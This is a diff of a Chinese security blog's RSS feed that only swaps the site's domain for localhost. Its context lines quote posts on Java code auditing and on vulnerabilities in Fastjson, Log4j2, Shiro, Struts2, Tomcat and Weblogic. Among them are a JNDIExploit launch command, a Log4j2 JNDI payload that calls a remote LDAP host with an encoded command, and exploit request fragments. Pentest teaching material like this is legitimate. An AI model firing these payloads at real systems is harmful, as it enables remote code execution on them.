@@ -2,22 +2,22 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
   <channel>
     <title>Java安全 on 养猪日记</title>
-    <link>https://yangzhuzai.github.io/categories/java%E5%AE%89%E5%85%A8/</link>
+    <link>http://localhost:1313/categories/java%E5%AE%89%E5%85%A8/</link>
     <description>Recent content in Java安全 on 养猪日记</description>
     <image>
       <title>养猪日记</title>
-      <url>https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</url>
-      <link>https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
+      <url>http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</url>
+      <link>http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
     </image>
     <generator>Hugo -- 0.135.0</generator>
     <language>en</language>
     <lastBuildDate>Thu, 19 Dec 2024 14:25:59 +0800</lastBuildDate>
-    <atom:link href="https://yangzhuzai.github.io/categories/java%E5%AE%89%E5%85%A8/index.xml" rel="self" type="application/rss+xml" />
+    <atom:link href="http://localhost:1313/categories/java%E5%AE%89%E5%85%A8/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>代码审计总结</title>
-      <link>https://yangzhuzai.github.io/posts/java/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/</link>
+      <link>http://localhost:1313/posts/java/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/</link>
       <pubDate>Thu, 19 Dec 2024 14:25:59 +0800</pubDate>
-      <guid>https://yangzhuzai.github.io/posts/java/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/</guid>
+      <guid>http://localhost:1313/posts/java/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/</guid>
       <description>&lt;h1 id=&#34;前言&#34;&gt;前言&lt;/h1&gt;
 &lt;p&gt;Java安全是一个比较庞大的东西，单论Java代码审计所需要的知识点其实较为简单，Java安全研究会比较深入，其实可以这两者可以较为明显的区分开来，一个为了业务服务，一个为了深入挖掘。单论安全服务以及渗透测试的程度，业务层面的Java代码审计足以。如果是要深入研究的话，愚见认为，不同的岗位决定对知识的掌握深度，当前岗位如果有深入需求再考虑。以下文章内容仅从快速完成代码审计的视角出发，不涉及深入的漏洞研究。&lt;/p&gt;
 &lt;h1 id=&#34;常见组件漏洞&#34;&gt;常见组件漏洞&lt;/h1&gt;
@@ -44,13 +44,13 @@ shiro还可以通过配置文件的方式进行配置，同样可以搜索关键
 org.apache.shiro.web.mgt.DefaultWebSecurityManager
 org.apache.shiro.web.mgt.CookieRememberMeManager
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;案例：&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/dmsj_img/Pasted%20image%2020241210212625.png&#34; alt=&#34;&#34;  /&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/dmsj_img/Pasted%20image%2020241210212625.png&#34; alt=&#34;&#34;  /&gt;
 &lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/dmsj_img/Pasted%20image%2020241210212644.png&#34; alt=&#34;&#34;  /&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/dmsj_img/Pasted%20image%2020241210212644.png&#34; alt=&#34;&#34;  /&gt;
 &lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/dmsj_img/Pasted%20image%2020241210212700.png&#34; alt=&#34;&#34;  /&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/dmsj_img/Pasted%20image%2020241210212700.png&#34; alt=&#34;&#34;  /&gt;
 &lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/dmsj_img/Pasted%20image%2020241210212952.png&#34; alt=&#34;&#34;  /&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/dmsj_img/Pasted%20image%2020241210212952.png&#34; alt=&#34;&#34;  /&gt;
 &lt;/p&gt;
 &lt;h3 id=&#34;权限绕过&#34;&gt;权限绕过：&lt;/h3&gt;
 &lt;table&gt;
@@ -99,9 +99,9 @@ org.apache.shiro.web.mgt.CookieRememberMeManager
     </item>
     <item>
       <title>Fastjson</title>
-      <link>https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/fastjson/</link>
+      <link>http://localhost:1313/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/fastjson/</link>
       <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
-      <guid>https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/fastjson/</guid>
+      <guid>http://localhost:1313/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/fastjson/</guid>
       <description>&lt;h1 id=&#34;一fastjson介绍&#34;&gt;一、FastJson介绍&lt;/h1&gt;
 &lt;p&gt;Fastjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java Object 之间互相转换，不需要添加额外的依赖，能够直接跑在JDK上，FastJson采用独创的算法，将序列化的速度提升到极致，深受用户喜爱。产品主要提供两个接口 JSON.toJSONString 和 JSON.parseObject/JSON.parse 来分别实现序列化和反序列化操作。&lt;/p&gt;
 &lt;h1 id=&#34;二漏洞原理&#34;&gt;二、漏洞原理&lt;/h1&gt;
@@ -118,7 +118,7 @@ org.apache.shiro.web.mgt.CookieRememberMeManager
 &lt;p&gt;远程数据传输，不安全的反序列化可以造成RCE；&lt;/p&gt;
 &lt;h3 id=&#34;214-jndi&#34;&gt;2.1.4 JNDI&lt;/h3&gt;
 &lt;p&gt;Java名称与目录服务接口，可以理解为一个强大的通讯录，可以定位用户、网络、对象、机器等等资源&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/zj_img/WEBRESOURCE0cc7bd9389f51609d1ea7294c65b0e20image.png&#34; alt=&#34;&#34;  /&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/zj_img/WEBRESOURCE0cc7bd9389f51609d1ea7294c65b0e20image.png&#34; alt=&#34;&#34;  /&gt;
 &lt;/p&gt;
 &lt;p&gt;在实战利用中，常见的服务为LDAP、DNS、RMI，具体的代码实现效果为，如果lookup可控就可以导致JNDI注入&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;InitialContext context = new InitialContext();
@@ -156,9 +156,9 @@ jrmp的payload（其实就是绕过了黑名单能发送数据的类）
     </item>
     <item>
       <title>Log4j2</title>
-      <link>https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/log4j2/</link>
+      <link>http://localhost:1313/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/log4j2/</link>
       <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
-      <guid>https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/log4j2/</guid>
+      <guid>http://localhost:1313/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/log4j2/</guid>
       <description>&lt;h1 id=&#34;一log4j2&#34;&gt;一、Log4j2&lt;/h1&gt;
 &lt;p&gt;Log4j是Apache的一个开源项目，通过使用Log4j，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。&lt;/p&gt;
 &lt;p&gt;​ Log4j在工程中可以易用，方便等代替了 System.out 等打印语句，它是Java下最流行的日志输入工具，一些著名的开源项目，像spring、hibernate、struts都使用该工具作为日志输入工具，可以帮助调试（有时候debug是发挥不了作用的）和分析。&lt;/p&gt;
@@ -189,7 +189,7 @@ JndiLookup.lookup()调用JndiManager.getDefaultManager()获得context
 &lt;p&gt;开启log4j2的JNDI注入工具：&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;java -jar JNDIExploit-1.4-SNAPSHOT.jar -i 192.168.2.40
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;值得注意的是，此处的IP不能为回环地址，而必须为使用的IP地址&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/zj_img/WEBRESOURCEf4a59216cb0105b4103e10fc35a7697b%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/zj_img/WEBRESOURCEf4a59216cb0105b4103e10fc35a7697b%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
 &lt;/p&gt;
 &lt;p&gt;发送恶意payload:&lt;/p&gt;
 &lt;p&gt;基础payload:&lt;/p&gt;
@@ -201,9 +201,9 @@ ${jndi:ldap://10.10.14.147:1389/ldap://10.10.14.147:1389/Basic/Command/Base64/Ym
     </item>
     <item>
       <title>shiro</title>
-      <link>https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/shiro/</link>
+      <link>http://localhost:1313/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/shiro/</link>
       <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
-      <guid>https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/shiro/</guid>
+      <guid>http://localhost:1313/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/shiro/</guid>
       <description>&lt;h1 id=&#34;一shiro&#34;&gt;一、shiro&lt;/h1&gt;
 &lt;p&gt;Apache Shiro是用来做认证和授权的框架，执行身份验证、授权、密码和会话管理。&lt;/p&gt;
 &lt;p&gt;Shiro主要配合一些容器的使用，如Tomcat、Weblogic等；同时有些框架也会将Shiro集成用来做身份认证和授权，比如：SpringBoot等；&lt;/p&gt;
@@ -225,7 +225,7 @@ ${jndi:ldap://10.10.14.147:1389/ldap://10.10.14.147:1389/Basic/Command/Base64/Ym
 &lt;p&gt;（2）由于该版本AES加密的密钥Key被硬编码在代码里（漏洞能够被利用的本质），且大部分项目未修改默认AES密钥，这意味着攻击者只要通过源代码找到AES加密的密钥，就可以构造一个恶意对象，对其进行序列化，AES加密，Base64编码，然后将其作为cookie的Remember Me字段值发送，Shiro将数据进行解密并且反序列化，最终触发反序列化漏洞。&lt;/p&gt;
 &lt;p&gt;官方针对这个漏洞的修复方式将使用默认硬编码的Key改为生成随机的Key加密。&lt;/p&gt;
 &lt;p&gt;密钥保存位置：&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/zj_img/WEBRESOURCEe42a394535820c01dae3f4e45464ea1dimage.png&#34; alt=&#34;&#34;  /&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/zj_img/WEBRESOURCEe42a394535820c01dae3f4e45464ea1dimage.png&#34; alt=&#34;&#34;  /&gt;
 &lt;/p&gt;
 &lt;p&gt;最后的触发位置是标准的readobject()，所以利用链基本上就是CC链或者其他依赖链了。&lt;/p&gt;
 &lt;h3 id=&#34;cve-2019-12422shiro-721&#34;&gt;CVE-2019-12422/Shiro-721&lt;/h3&gt;
@@ -244,9 +244,9 @@ ${jndi:ldap://10.10.14.147:1389/ldap://10.10.14.147:1389/Basic/Command/Base64/Ym
     </item>
     <item>
       <title>Spring</title>
-      <link>https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/spring/</link>
+      <link>http://localhost:1313/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/spring/</link>
       <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
-      <guid>https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/spring/</guid>
+      <guid>http://localhost:1313/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/spring/</guid>
       <description>&lt;h1 id=&#34;一spring生态&#34;&gt;一、Spring生态&lt;/h1&gt;
 &lt;p&gt;Spring开源框架由Rod Johnson创建，从简单性、可测试性和松耦合的角度而言， 任何Java应用都可以从Spring中受益。 时至今日Spring已不再是一个简单的编程框架了，在整个Spring生态中包含了许多 应用在特定场景的具体框架，如：“Spring Framework”，“Spring Security”，“Spring Boot”，“Spring Cloud”等等，其中“Spring Framework”框架是 整个生态的核心基础，每个框架都有自己独立的代码仓库。&lt;/p&gt;
 &lt;p&gt;Spring生态系统提供许多有用的编程框架或工具集。 当下最为流行的Spring项目： Spring Framework，Spring Security，Spring Boot，Spring Cloud等。&lt;/p&gt;
@@ -263,9 +263,9 @@ ${jndi:ldap://10.10.14.147:1389/ldap://10.10.14.147:1389/Basic/Command/Base64/Ym
     </item>
     <item>
       <title>Struts2</title>
-      <link>https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/struts2/</link>
+      <link>http://localhost:1313/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/struts2/</link>
       <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
-      <guid>https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/struts2/</guid>
+      <guid>http://localhost:1313/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/struts2/</guid>
       <description>&lt;h1 id=&#34;一struts2&#34;&gt;一、Struts2&lt;/h1&gt;
 &lt;p&gt;Struts2框架是一个用于开发Java EE网络应用程序的开放源代码网页应用程序架构。它利用并延伸了Java Servlet API，鼓励开发者采用MVC架构。Struts2以WebWork优秀的设计思想为核心，吸收了Struts框架的部分优点，提供了一个更加整洁的MVC设计模式实现的Web应用程序框架。&lt;/p&gt;
 &lt;h1 id=&#34;二漏洞原理&#34;&gt;二、漏洞原理&lt;/h1&gt;
@@ -304,9 +304,9 @@ Content-Disposition: form-data; name=&amp;#34;id&amp;#34;
     </item>
     <item>
       <title>Tomcat</title>
-      <link>https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/tomcat/</link>
+      <link>http://localhost:1313/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/tomcat/</link>
       <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
-      <guid>https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/tomcat/</guid>
+      <guid>http://localhost:1313/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/tomcat/</guid>
       <description>&lt;h1 id=&#34;一tomcat&#34;&gt;一、Tomcat&lt;/h1&gt;
 &lt;p&gt;Tomcat是Apache 软件基金会（Apache Software Foundation）的Jakarta 项目中的一个核心项目，由Apache、Sun 和其他一些公司及个人共同开发而成。由于有了Sun 的参与和支持，最新的Servlet 和JSP 规范总是能在Tomcat 中得到体现，Tomcat 5支持最新的Servlet 2.4 和JSP 2.0 规范。因为Tomcat 技术先进、性能稳定，而且免费，因而深受Java 爱好者的喜爱并得到了部分软件开发商的认可，成为目前比较流行的Web 应用服务器。&lt;/p&gt;
 &lt;h1 id=&#34;二漏洞介绍与利用&#34;&gt;二、漏洞介绍与利用&lt;/h1&gt;
@@ -332,9 +332,9 @@ cxk
     </item>
     <item>
       <title>Weblogic</title>
-      <link>https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/weblogic/</link>
+      <link>http://localhost:1313/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/weblogic/</link>
       <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
-      <guid>https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/weblogic/</guid>
+      <guid>http://localhost:1313/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/weblogic/</guid>
       <description>&lt;h1 id=&#34;一weblogic&#34;&gt;一、Weblogic&lt;/h1&gt;
 &lt;p&gt;Weblogic 是美国 Oracle 公司出品的应用服务器软件，确切的说这是基于 Java EE 架构的中间件，主要用于开发、继承、部署和管理大型分布式 web 应用、网络应用和数据库应用。Weblogic 将 Java 的动态功能和 Java Enterprise 标准的安全性引入大型网络应用的开发、集成、部署和管理之中，是商业市场上主要的 Java 应用服务器软件之一，也是世界上第一个成功商业化的 Java EE 应用服务器，当然 Weblogic 具有可扩展性、快速开发、灵活可靠等优势，其默认端口为7001，目前比较活跃的版本为10和12，最新版本为14。&lt;/p&gt;
 &lt;p&gt;在功能性上，Weblogic 是 Java EE 的全能应用服务器，包括 EJB、JSP、servlet、JMS 等，是商业软件中排名第一的容器（JSP、servlet、EJB等），并提供其他工具（例如Java编辑器），因此也是一个综合的开发以及运行环境。在扩展性上，Weblogic Server 凭借出色的群集技术，拥有处理关键 web 应用系统问题所需的性能、扩展性和高可用性。Weblogic Server 既实现了网页集群，也实现了EJB组件群集，而且不需要任何专门的硬件或操作系统支持。网页群集可以实现透明的复制、负载平衡以及表示内容容错。无论是网页群集还是组建群集，对于电子商务解决方案所要求的可扩展性和可用性都是至关重要的。&lt;/p&gt;
@@ -380,7 +380,7 @@ Content-Length: 633
 &amp;lt;/soapenv:Header&amp;gt;
 &amp;lt;soapenv:Body/&amp;gt;
 &amp;lt;/soapenv:Envelope&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/zj_img/WEBRESOURCE82c2c4952a93c896bb4a2d5db2359a53%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/zj_img/WEBRESOURCE82c2c4952a93c896bb4a2d5db2359a53%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
 &lt;/p&gt;</description>
     </item>
   </channel>
